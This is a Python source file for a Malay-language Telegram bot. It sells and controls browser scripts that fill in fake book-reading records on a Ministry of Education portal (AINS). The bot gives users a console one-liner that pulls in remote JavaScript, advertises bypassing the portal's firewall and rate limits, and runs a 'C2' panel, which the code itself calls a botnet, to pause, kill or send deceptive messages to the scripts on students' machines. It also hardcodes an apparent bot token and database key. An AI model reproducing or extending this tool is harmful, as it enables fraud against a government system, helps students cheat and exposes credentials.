import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import subprocess
import os
import urllib.request
import urllib.error
import time
import datetime
import math

# Konfigurasi Utama
TOKEN = '8298046313:AAHqwkuWkTbxSFSZB7DO4fNrfT1hBkMWKVs'
OWNER_ID = 8402309532
bot = telebot.TeleBot(TOKEN)

# Konfigurasi Supabase
SUPA_URL = 'https://yzjsmtxhpdlsniqpcuoa.supabase.co/rest/v1/nilam_used_books'
SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl6anNtdHhocGRsc25pcXBjdW9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5Mzk2ODQsImV4cCI6MjA4MDUxNTY4NH0.jMq8BwvYlODSWiFv7ysM7KiDCjzviMEJFdn1Vfst3mw'

START_TIME = time.time()
DB_FILE = 'bot_users_db.json'

# --- DATABASE PENGGUNA (SaaS) ---
def load_users():
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(DB_FILE, 'w') as f:
        json.dump(users, f, indent=4)

def get_user_plan(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"plan": "free", "joined": time.time()}
        save_users(users)
    if user_id == OWNER_ID:
        return "owner"
    return users[uid].get("plan", "free")

# --- FUNGSI UTILITI ---
def get_used_books_count():
    try:
        req = urllib.request.Request(f"{SUPA_URL}?select=title", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
            return len([x for x in data if not x['title'].startswith('__TEL__|')])
    except: return 0

def get_live_users():
    try:
        req = urllib.request.Request(f"{SUPA_URL}?title=like.__TEL__|*", headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode('utf-8'))
        
        now = int(time.time() * 1000)
        active = []
        for row in data:
            p = row['title'].split('|')
            if len(p) >= 7:
                uid, ts, ok, fail, tgt, status = p[1], int(p[2]), p[3], p[4], p[5], p[6]
                idle_sec = (now-ts)//1000
                if idle_sec < 300: # 5 mins
                    active.append({
                        "uid": uid, "ok": int(ok), "tgt": int(tgt), "fail": int(fail), "status": status, "idle": idle_sec
                    })
        return active
    except: return []

def generate_progress_bar(percent, length=15):
    filled = math.floor(length * (percent / 100))
    empty = length - filled
    return "█" * filled + "░" * empty

# --- MENU UI ---
def get_main_menu(user_id):
    plan = get_user_plan(user_id)
    markup = InlineKeyboardMarkup(row_width=2)
    
    markup.add(
        InlineKeyboardButton("📊 Analitik & Metrik", callback_data="menu_analytics"),
        InlineKeyboardButton("⚙️ Automasi & Skrip", callback_data="menu_actions")
    )
    
    if plan == "free":
        markup.add(InlineKeyboardButton("💎 Naik Taraf (Upgrade PRO)", callback_data="cmd_upgrade"))
    
    # Hanya Owner boleh akses Database & Sistem
    if plan == "owner":
        markup.add(
            InlineKeyboardButton("👑 Panel Admin", callback_data="cmd_admin"),
            InlineKeyboardButton("📚 Pangkalan Data", callback_data="menu_db")
        )
        markup.add(
            InlineKeyboardButton("🖥️ Diagnostik Sistem", callback_data="menu_system"),
            InlineKeyboardButton("📡 C2 Command Center", callback_data="menu_c2")
        )
        
    markup.add(InlineKeyboardButton("❓ Panduan Pusat Kawalan", callback_data="cmd_help"))
    return markup

def get_analytics_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📈 Laporan Keseluruhan", callback_data="cmd_stats"),
        InlineKeyboardButton("📡 Telemetri Pelajar (Live)", callback_data="cmd_live")
    )
    markup.add(InlineKeyboardButton("🏆 Carta Pendahulu", callback_data="cmd_leaderboard"))
    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
    return markup

def get_actions_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💉 Dapatkan Skrip", callback_data="cmd_script"),
        InlineKeyboardButton("⚡ Tetapan Jitter", callback_data="cmd_speed")
    )
    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
    return markup

def get_c2_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⏸️ Pause Semua", callback_data="c2_pause"),
        InlineKeyboardButton("▶️ Resume Semua", callback_data="c2_resume")
    )
    markup.add(
        InlineKeyboardButton("🛑 KILL SWITCH", callback_data="c2_kill"),
        InlineKeyboardButton("📢 Broadcast Mesej", callback_data="c2_msg")
    )
    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
    return markup

def get_db_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔄 Tarik Buku (OpenLibrary)", callback_data="cmd_fetch"),
        InlineKeyboardButton("🗑️ Format Memori Awan", callback_data="cmd_reset_confirm")
    )
    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
    return markup

def get_system_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🌐 Uji Rangkaian AINS (Ping)", callback_data="cmd_ping"),
        InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main")
    )
    return markup

@bot.message_handler(commands=['addpro'])
def add_pro_user(message):
    user_id = message.chat.id
    if get_user_plan(user_id) != "owner":
        bot.reply_to(message, "⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.")
        return
        
    try:
        target_id = message.text.split(' ')[1]
        users = load_users()
        if target_id not in users:
            users[target_id] = {"plan": "pro", "joined": time.time()}
        else:
            users[target_id]["plan"] = "pro"
        save_users(users)
        bot.reply_to(message, f"✅ Berjaya! ID pengguna <code>{target_id}</code> telah dinaik taraf ke pelan <b>PRO</b>.", parse_mode="HTML")
    except IndexError:
        bot.reply_to(message, "⚠️ Format salah. Sila guna:\n<code>/addpro &lt;user_id&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['removepro'])
def remove_pro_user(message):
    user_id = message.chat.id
    if get_user_plan(user_id) != "owner":
        bot.reply_to(message, "⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.")
        return
        
    try:
        target_id = message.text.split(' ')[1]
        users = load_users()
        if target_id in users:
            users[target_id]["plan"] = "free"
            save_users(users)
            bot.reply_to(message, f"✅ Berjaya! ID pengguna <code>{target_id}</code> telah diturunkan taraf ke pelan <b>FREE</b>.", parse_mode="HTML")
        else:
            bot.reply_to(message, f"⚠️ Pengguna <code>{target_id}</code> tidak dijumpai dalam sistem.", parse_mode="HTML")
    except IndexError:
        bot.reply_to(message, "⚠️ Format salah. Sila guna:\n<code>/removepro &lt;user_id&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    user_id = message.chat.id
    plan = get_user_plan(user_id)
    plan_badge = "👑 OWNER" if plan == "owner" else ("💎 PRO" if plan == "pro" else "🆓 FREE")
    
    text = (
        "<b>⚡ NILAM COMMAND CENTER [PRO]</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<blockquote>Sistem Pengurusan Automasi AINS Termaju (v15.0 Ultimate).\n"
        "Dilengkapi dengan pemantauan telemetri masa nyata, pengurusan storan awan, dan pemintas WAF.</blockquote>\n\n"
        "Sila pilih modul operasi anda di bawah:"
    )
    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_main_menu(user_id))

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    user_id = call.from_user.id
    plan = get_user_plan(user_id)
    plan_badge = "👑 OWNER" if plan == "owner" else ("💎 PRO" if plan == "pro" else "🆓 FREE")
    
    # RBAC Guard
    owner_only_cmds = ["menu_db", "menu_system", "menu_c2", "cmd_fetch", "cmd_reset_confirm", "cmd_reset_execute", "cmd_ping", "cmd_admin", "c2_pause", "c2_resume", "c2_kill", "c2_msg"]
    if call.data in owner_only_cmds and plan != "owner":
        bot.answer_callback_query(call.id, "⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.", show_alert=True)
        return

    if call.data == "cmd_main":
        text = (
            "<b>⚡ NILAM COMMAND CENTER [PRO]</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "<blockquote>Sistem dalam keadaan bersedia (Standby). Semua fungsi berjalan lancar tanpa ralat.</blockquote>\n\n"
            "Sila pilih arahan seterusnya:"
        )
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_main_menu(user_id))

    elif call.data == "menu_analytics":
        text = "<b>📊 MODUL ANALITIK & METRIK</b>\n\n<blockquote>Pantau keseluruhan metrik prestasi sistem, bacaan telemetri pelajar, dan carta kelajuan.</blockquote>"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_analytics_menu())

    elif call.data == "menu_actions":
        text = "<b>⚙️ MODUL AUTOMASI & SKRIP</b>\n\n<blockquote>Dapatkan skrip suntikan terkini dan urus tetapan kelajuan (Jitter) automasi.</blockquote>"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_actions_menu())

    elif call.data == "menu_c2":
        text = (
            "<b>📡 C2 COMMAND CENTER</b>\n\n"
            "<blockquote>Hantar isyarat (signal) terus kepada skrip yang sedang aktif di komputer pelajar.\n\n"
            "<b>Amaran:</b> Arahan ini berkuatkuasa secara <i>Global</i> kepada semua pengguna.</blockquote>"
        )
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_c2_menu())

    elif call.data.startswith("c2_"):
        action = call.data.split('_')[1].upper()
        bot.answer_callback_query(call.id, f"Menghantar isyarat {action}...")
        try:
            import urllib.parse
            timestamp = str(int(time.time() * 1000))
            if action == 'MSG':
                payload = f"__CMD__|MSG|Kemas kini pelayan AINS dikesan. Sila rehat sementara waktu.|{timestamp}"
            else:
                payload = f"__CMD__|{action}|{timestamp}"
            
            query_param = urllib.parse.quote('like.__CMD__|%')
            req = urllib.request.Request(f"{SUPA_URL}?title={query_param}", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
            try: urllib.request.urlopen(req)
            except: pass
            
            req = urllib.request.Request(SUPA_URL, method='POST', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}', 'Content-Type': 'application/json'}, data=json.dumps({"title": payload}).encode('utf-8'))
            urllib.request.urlopen(req)
            
            text = f"<b>✅ ISYARAT DIHANTAR</b>\n\n<blockquote>Berjaya memancarkan arahan <b>{action}</b> kepada seluruh rangkaian botnet.</blockquote>"
        except Exception as e:
            text = f"<b>❌ GAGAL MENGHANTAR ISYARAT</b>\n\n<code>{str(e)}</code>"
        
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali ke C2", callback_data="menu_c2"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "menu_db":
        text = "<b>📚 PANGKALAN DATA (DATABASE)</b>\n\n<blockquote>Urus perpustakaan buku sintetik tempatan dan selaraskan memori awan (Supabase).</blockquote>"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_db_menu())

    elif call.data == "menu_system":
        text = "<b>🖥️ MODUL DIAGNOSTIK SISTEM</b>\n\n<blockquote>Periksa kesihatan Command Center dan pelayan sasaran (AINS).</blockquote>"
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_system_menu())

    elif call.data == "cmd_stats":
        bot.answer_callback_query(call.id, "Menjana laporan prestasi...")
        try:
            with open('/root/NilamAutomationTools/books_library.json', 'r', encoding='utf-8') as f: 
                books = json.load(f)
            total = len(books)
            used = get_used_books_count()
            left = max(0, total - used)
            percent = (used / total) * 100 if total > 0 else 0
            bar = generate_progress_bar(percent)
            
            active_users = len(get_live_users())
            
            text = (
                "<b>📈 LAPORAN PRESTASI KESELURUHAN</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "<b>KEMAJUAN SINTETIK:</b>\n"
                f"<blockquote><code>[{bar}]</code> <b>{percent:.2f}%</b></blockquote>\n\n"
                "<b>📦 STATISTIK STOK BUKU:</b>\n"
                f"<blockquote>📚 <b>Jumlah Buku:</b> {total:,}\n"
                f"✅ <b>Dihantar:</b> {used:,}\n"
                f"⏳ <b>Baki Stok:</b> {left:,}</blockquote>\n\n"
                "<b>📡 METRIK PENGGUNAAN:</b>\n"
                f"<blockquote>👥 <b>Pelajar Aktif Kini:</b> {active_users} online</blockquote>\n\n"
                "<b>🛡️ STATUS WAF BYPASS:</b>\n"
                "<blockquote>🟢 Human Jitter Delay\n"
                "🟢 Query Cache-Busting\n"
                "🟢 Smart Auto-Sleep (Anti-Ban)</blockquote>"
            )
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Segarkan Data", callback_data="cmd_stats"))
            markup.add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
            bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
        except Exception as e:
            bot.answer_callback_query(call.id, "Ralat membaca data", show_alert=True)

    elif call.data == "cmd_live":
        bot.answer_callback_query(call.id, "Mengimbas isyarat telemetry...")
        users = get_live_users()
        
        text = "<b>📡 TELEMETRI PELAJAR (LIVE)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        if not users:
            text += "<blockquote>💤 <b>Tiada isyarat dikesan.</b>\nPastikan skrip sedang berjalan di mana-mana penyemak imbas (browser).</blockquote>"
        else:
            for u in users:
                p_ok, p_tgt = u['ok'], u['tgt']
                prog_pct = (p_ok / p_tgt * 100) if p_tgt > 0 else 0
                prog_bar = generate_progress_bar(prog_pct, 10)
                
                text += (
                    f"👤 <b>ID Pelajar:</b> <code>{u['uid']}</code>\n"
                    "<blockquote>"
                    f"📈 <b>Progres:</b> {p_ok} / {p_tgt} ({prog_pct:.0f}%)\n"
                    f"<code>[{prog_bar}]</code>\n"
                    f"⚠️ <b>Gagal:</b> {u['fail']} buku\n"
                    f"⏱️ <b>Status Semasa:</b> <i>{u['status']}</i>\n"
                    f"📡 <b>Isyarat Terakhir:</b> {u['idle']} saat lalu"
                    "</blockquote>\n"
                )
                
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔄 Segarkan Telemetri", callback_data="cmd_live"))
        markup.add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_leaderboard":
        bot.answer_callback_query(call.id, "Menyusun carta pendahulu...")
        users = get_live_users()
        users.sort(key=lambda x: x['ok'], reverse=True)
        
        text = "<b>🏆 CARTA PENDAHULU (TOP PELAJAR AKTIF)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        if not users:
            text += "<blockquote>💤 Belum ada data pengguna yang mencukupi untuk dipaparkan.</blockquote>"
        else:
            medals = ["🥇", "🥈", "🥉", "🎖️", "🎖️"]
            for i, u in enumerate(users[:5]):
                medal = medals[i] if i < len(medals) else "🏅"
                text += f"<blockquote>{medal} <b>{u['uid']}</b>\n└ Berjaya hantar: <b>{u['ok']} buku</b></blockquote>\n"
                
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_analytics"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_script":
        bot.answer_callback_query(call.id)
        if plan == "free":
            text = (
                "<b>💻 SKRIP AUTOMASI (VERSI FREE)</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Anda menggunakan pelan 🆓 <b>FREE</b>. Skrip ini mempunyai kelajuan asas dan terdedah kepada sekatan WAF (Ralat 429).\n\n"
                "<b>Salin kod di bawah ke Console:</b>\n"
                "<code>var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@007a597/n_free.js?v='+Date.now();document.head.appendChild(s);</code>\n\n"
                "<blockquote>⚠️ <b>Had Versi Percuma:</b>\n"
                "❌ Tiada WAF Bypass\n"
                "❌ Tiada Auto-Sleep\n"
                "❌ Jitter Rawak Ditutup</blockquote>\n\n"
                "<i>Naik taraf ke PRO untuk menikmati ciri Stealth dan elak sekatan pelayan!</i>"
            )
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💎 Naik Taraf PRO", callback_data="cmd_upgrade"), InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
        else:
            text = (
                "<b>💻 SKRIP INJECTION v15.0 [PRO]</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "Sila <b>salin (copy)</b> blok kod tunggal di bawah:\n\n"
                "<code>var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Notfoundst12/Nilam@007a597/n.js?v='+Date.now();document.head.appendChild(s);</code>\n\n"
                "<blockquote><b>Arahan Pemasangan:</b>\n"
                "1. Buka halaman 'Tambah Rekod' di AINS.\n"
                "2. Buka Developer Tools (F12) -> Console.\n"
                "3. Tampal (paste) kod dan tekan Enter.\n"
                "4. Butang 🚀 (Mod Menu) akan terpapar di skrin!</blockquote>"
            )
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
            
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
        
    elif call.data == "cmd_speed":
        bot.answer_callback_query(call.id)
        text = (
            "<b>⚡ TETAPAN KELAJUAN (JITTER)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<blockquote><b>Info Sistem:</b> Skrip v15.0 menggunakan sistem <b>Dynamic Jitter Delay</b> untuk meniru kelakuan manusia dan mengelakkan Firewall AINS (Ralat 429).</blockquote>\n\n"
            "<b>Formula Pergerakan Masa:</b>\n"
            "<code>Delay = (Asas * Pendarab) + Rawak(500ms - 1500ms)</code>\n\n"
            "<i>Sistem menetapkan kawalan ini secara dinamik dalam skrip web. Anda boleh menukar Delay Asas (Default: 600ms) melalui fungsi Slider pada Panel UI di browser.</i>"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_actions"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_upgrade":
        bot.answer_callback_query(call.id)
        text = (
            "<b>💎 PELAN NAIK TARAF KE PRO (VIP)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<blockquote><i>\"Kenapa buang masa 5 jam mengklik borang, jika bot boleh menyiapkannya dalam masa 5 minit?\"</i></blockquote>\n\n"
            "Versi FREE direka untuk gagal. Pelayan akan mengesan anda dan menyekat IP anda (Ralat 429). Lindungi diri anda dan jimat masa dengan <b>Pelan PRO</b>.\n\n"
            "<b>🔥 CIRI-CIRI EKSKLUSIF PRO:</b>\n"
            "✅ <b>Tiada Had Buku</b> (Jalan 100+ buku tanpa henti)\n"
            "✅ <b>WAF Bypass Asing</b> (Gagal dikesan oleh Firewall AINS)\n"
            "✅ <b>Smart Jitter</b> (Meniru corak klik manusia sebenar)\n"
            "✅ <b>Auto-Sleep Engine</b> (Tidur bila disyaki, bangun bila selamat)\n"
            "✅ <b>Sokongan Premium</b> (Kemaskini patch selagi AINS wujud)\n\n"
            "<b>💰 HARGA LELONGAN KHAS HARI INI:</b>\n"
            "<s>RM 50.00 / bulan</s>\n"
            "<b>🔥 RM 15.00 / Seumur Hidup! (Bayar Sekali Sahaja)</b>\n\n"
            "<i>(Terhad kepada 10 pembeli pertama minggu ini. Selepas ini harga kembali normal)</i>"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💳 Beli Sekarang (Direct Owner)", url="tg://user?id=8402309532"))
        markup.add(InlineKeyboardButton("🔙 Kembali ke Menu", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_admin":
        users = load_users()
        total_users = len(users)
        pro_users = len([u for u, d in users.items() if d.get('plan') == 'pro'])
        text = (
            "<b>👑 PANEL ADMIN (OWNER SAHAJA)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<blockquote>Pusat kawalan pangkalan data pengguna bot.</blockquote>\n\n"
            f"👥 <b>Jumlah Pengguna Bot:</b> {total_users}\n"
            f"💎 <b>Pengguna PRO:</b> {pro_users}\n"
            f"🆓 <b>Pengguna FREE:</b> {total_users - pro_users}\n\n"
            "<i>Sistem langganan (SaaS) sedang aktif.</i>"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_fetch":
        bot.answer_callback_query(call.id, "Scraping buku dari perpustakaan...")
        subprocess.Popen(["python3", "/root/NilamAutomationTools/fetch_books3.py"])
        text = (
            "<b>🔄 PENGUMPULAN DATA API (OPENLIBRARY)</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<blockquote>Jentera <b>Web Scraper</b> telah dilancarkan di latar belakang. Ia sedang menarik beribu-ribu metadata buku baharu dari OpenLibrary.</blockquote>\n\n"
            "<i>Tindakan ini tidak mengganggu operasi pengguna yang sedang menjalankan skrip. Sila semak semula Dashboard selepas beberapa minit.</i>"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_db"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_reset_confirm":
        text = (
            "<b>⚠️ PENGESAHAN RESET DATABASE</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<blockquote><b>AMARAN KRITIKAL!</b> Anda sedang cuba memadam <b>KESELURUHAN</b> rekod memori awan (Cloud Memory) dari Supabase.</blockquote>\n\n"
            "Tindakan ini <b>TIDAK BOLEH DIUNDURKAN</b>. Skrip akan mula mengekstrak buku dari nombor indeks sifar (0). Ini berisiko tinggi menyebabkan ralat <i>Duplicate Entry</i> secara besar-besaran jika akaun pelajar yang sama digunakan pada portal.\n\n"
            "Sila buat pilihan pengesahan:"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("❌ BATALKAN", callback_data="menu_db"),
            InlineKeyboardButton("🚨 YA, FORMAT SEKARANG", callback_data="cmd_reset_execute")
        )
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_reset_execute":
        bot.answer_callback_query(call.id, "Memformat data awan...")
        try:
            req = urllib.request.Request(f"{SUPA_URL}?title=not.eq.random_string", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
            urllib.request.urlopen(req)
            text = (
                "<b>✅ DATABASE BERJAYA DIFORMAT</b>\n\n"
                "<blockquote>Supabase Cloud Memory kini 100% bersih. Kesemua isyarat telemetri dan log buku telah dikosongkan. Sistem sedia beroperasi kembali.</blockquote>"
            )
        except Exception as e:
            text = (
                "<b>❌ RALAT PENGHAPUSAN</b>\n\n"
                "<blockquote>Sistem gagal memformat pangkalan data. Ralat dipulangkan:\n"
                f"<code>{str(e)}</code></blockquote>"
            )
        
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali ke Pangkalan Data", callback_data="menu_db"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_ping":
        bot.answer_callback_query(call.id, "Menghantar paket ICMP...")
        try:
            start = time.time()
            res = urllib.request.urlopen("https://ains-api.moe.gov.my", timeout=5)
            ms = int((time.time() - start) * 1000)
            status = "🟢 ONLINE & STABIL" if res.status == 200 else f"🟡 HTTP {res.status}"
        except urllib.error.HTTPError as e:
            ms = int((time.time() - start) * 1000)
            # 429 and 401 are expected from API without token, meaning server is reachable
            if e.code in [401, 403, 404, 405, 429]:
                status = f"🟢 ONLINE (API Response: {e.code})"
            else:
                status = f"🔴 ERROR (HTTP {e.code})"
        except Exception as e:
            ms = "N/A"
            status = "🔴 OFFLINE / TIMEOUT"

        uptime_seconds = int(time.time() - START_TIME)
        uptime_str = str(datetime.timedelta(seconds=uptime_seconds))

        text = (
            "<b>🖥️ DIAGNOSTIK KESIHATAN SISTEM</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<b>📡 PELAYAN AINS (MOE):</b>\n"
            "<blockquote>"
            f"<b>Status:</b> {status}\n"
            f"<b>Latensi Rangkaian:</b> <code>{ms} ms</code>\n"
            "<b>WAF Firewall:</b> Aktif (Rate Limiting dikesan)\n"
            "<b>Protokol Penyulitan:</b> TLS 1.3 Disahkan"
            "</blockquote>\n\n"
            "<b>🤖 ENJIN COMMAND CENTER:</b>\n"
            "<blockquote>"
            f"<b>Masa Beroperasi (Uptime):</b> <code>{uptime_str}</code>\n"
            "<b>Senibina Aplikasi:</b> Python 3 / pyTelegramBotAPI\n"
            "<b>Pangkalan Data Awan:</b> Supabase REST (Tersambung)"
            "</blockquote>"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔄 Uji Semula (Ping)", callback_data="cmd_ping"))
        markup.add(InlineKeyboardButton("🔙 Kembali", callback_data="menu_system"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

    elif call.data == "cmd_help":
        text = (
            "<b>❓ PANDUAN PUSAT KAWALAN PRO</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<b>Info Sistem (v15.0)</b>\n"
            "<blockquote>Skrip automasi ini dibina secara khusus untuk mengemudi dan mengatasi halangan pada portal AINS. Ia mengautomasikan pengisian data buku, meniru rentak kelakuan manusia (Jitter), dan menipu sistem sekatan pelayan (WAF Bypass).</blockquote>\n\n"
            "<b>Teknologi Telemetri Masa Nyata</b>\n"
            "<blockquote>Apabila seseorang pengguna memasukkan kod di pelayar web, skrip akan mewujudkan satu 'jambatan rahsia' yang memancarkan laporan terus ke Supabase. Bot Telegram ini bertindak memintas isyarat tersebut dan menterjemahkannya kepada paparan Live Users dan Metrik.</blockquote>\n\n"
            "<b>Amaran Keselamatan</b>\n"
            "<blockquote><b>SANGAT PENTING:</b> Dilarang sama sekali menyebarkan pautan CDN skrip anda kepada awam. Ini bagi mengelakkan pihak pentadbir AINS memuat turun skrip, menganalisis struktur 'Bypass' kita, dan menutup kelompongan sistem mereka buat selamanya.</blockquote>"
        )
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)

if __name__ == "__main__":
    print("Bot Command Center v15.0 sedang berjalan...")
    bot.polling(none_stop=True, timeout=60)
